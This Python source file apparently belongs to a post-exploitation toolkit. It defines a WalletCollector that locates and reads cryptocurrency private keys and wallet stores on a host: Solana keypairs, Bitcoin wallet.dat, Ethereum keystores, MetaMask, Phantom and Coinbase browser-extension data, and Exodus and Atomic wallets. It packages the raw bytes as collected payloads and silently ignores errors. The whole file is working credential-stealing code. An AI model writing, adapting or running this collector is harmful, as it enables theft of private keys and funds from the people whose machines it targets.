
from __future__ import annotations

import json
import logging
import os
from pathlib import Path
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

_LOG = logging.getLogger(__name__)

class WalletCollector(BaseCollector):
    """
    Collect cryptocurrency wallet artifacts and keypairs.
    
    Targets:
      - ~/.config/solana/id.json
      - ~/.bitcoin/wallet.dat
      - ~/.ethereum/keystore/
      - Browser extension wallet paths (Metamask, etc.)
    """

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        solana_id = Path.home() / ".config" / "solana" / "id.json"
        if solana_id.exists():
            yield ArtifactMetadata(
                artifact_family="crypto_wallet",
                artifact_subtype="solana_id",
                source_path=str(solana_id),
                source_platform=os.name,
                collection_method="file_read",
            )

        bitcoin_wallet = Path.home() / ".bitcoin" / "wallet.dat"
        if bitcoin_wallet.exists():
            yield ArtifactMetadata(
                artifact_family="crypto_wallet",
                artifact_subtype="bitcoin_wallet",
                source_path=str(bitcoin_wallet),
                source_platform=os.name,
                collection_method="file_read",
            )

        eth_keystore = Path.home() / ".ethereum" / "keystore"
        if eth_keystore.exists():
            yield ArtifactMetadata(
                artifact_family="crypto_wallet",
                artifact_subtype="ethereum_keystore",
                source_path=str(eth_keystore),
                source_platform=os.name,
                collection_method="directory_discovery",
                report_safe_summary_fields={"wallet_store": "ethereum_keystore"},
            )

        for artifact_subtype, path in self._browser_wallet_paths():
            if path.exists():
                yield ArtifactMetadata(
                    artifact_family="crypto_wallet",
                    artifact_subtype=artifact_subtype,
                    source_path=str(path),
                    source_platform=os.name,
                    collection_method="directory_discovery",
                    report_safe_summary_fields={"wallet_store": artifact_subtype},
                )

        desktop_wallet_paths = {
            "desktop_exodus": Path(os.environ.get("APPDATA", "")) / "Exodus" if os.name == "nt" else Path.home() / ".config" / "Exodus",
            "desktop_atomic": Path(os.environ.get("APPDATA", "")) / "atomic" if os.name == "nt" else Path.home() / ".config" / "atomic",
        }

        for artifact_subtype, path in desktop_wallet_paths.items():
            if path.exists():
                yield ArtifactMetadata(
                    artifact_family="crypto_wallet",
                    artifact_subtype=artifact_subtype,
                    source_path=str(path),
                    source_platform=os.name,
                    collection_method="directory_discovery",
                    report_safe_summary_fields={"wallet_store": artifact_subtype},
                )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        try:
            path = Path(artifact.source_path)
            if not path.exists():
                return None

            if artifact.collection_method == "directory_discovery":
                data, directory_summary = self._archive_directory(path)
                if not data:
                    return None
                artifact.report_safe_summary_fields = {
                    **artifact.report_safe_summary_fields,
                    **directory_summary,
                }
                return self._record_payload(
                    artifact=artifact,
                    raw_data=data,
                    logical_path=str(path),
                    ext=artifact.artifact_subtype or "wallet_dir",
                )

            data = path.read_bytes()
            if artifact.artifact_subtype == "solana_id":
                artifact.report_safe_summary_fields = {
                    **artifact.report_safe_summary_fields,
                    "wallet_store": "solana",
                }
                try:
                    artifact.report_safe_summary_fields["keypair_length"] = len(json.loads(data.decode("utf-8")))
                except (UnicodeDecodeError, json.JSONDecodeError, TypeError):
                    pass
            return self._record_payload(
                artifact=artifact,
                raw_data=data,
                logical_path=str(path),
                ext=artifact.artifact_subtype or "wallet",
            )

        except PermissionError:
            _LOG.debug("Permission denied: %s", artifact.source_path)
        except Exception as exc:
            _LOG.debug("Wallet artifact collection error (%s): %s", artifact.source_path, exc)
        return None

    @staticmethod
    def _browser_wallet_paths() -> tuple[tuple[str, Path], ...]:
        return (
            (
                "browser_extension_metamask",
                Path.home() / ".config" / "google-chrome" / "Default" / "Local Extension Settings" / "nkbihfbeogaeaoehlefnkodbefgpgknn",
            ),
            (
                "browser_extension_metamask",
                Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data" / "Default" / "Local Extension Settings" / "nkbihfbeogaeaoehlefnkodbefgpgknn",
            ),
            (
                "browser_extension_phantom",
                Path.home() / ".config" / "google-chrome" / "Default" / "Local Extension Settings" / "bfnaelmomeimhlpmgjnjophhpkkoljpa",
            ),
            (
                "browser_extension_phantom",
                Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data" / "Default" / "Local Extension Settings" / "bfnaelmomeimhlpmgjnjophhpkkoljpa",
            ),
            (
                "browser_extension_coinbase",
                Path.home() / ".config" / "google-chrome" / "Default" / "Local Extension Settings" / "hnpfjngllnobngcgfapefoaidbinmjnm",
            ),
            (
                "browser_extension_coinbase",
                Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data" / "Default" / "Local Extension Settings" / "hnpfjngllnobngcgfapefoaidbinmjnm",
            ),
        )
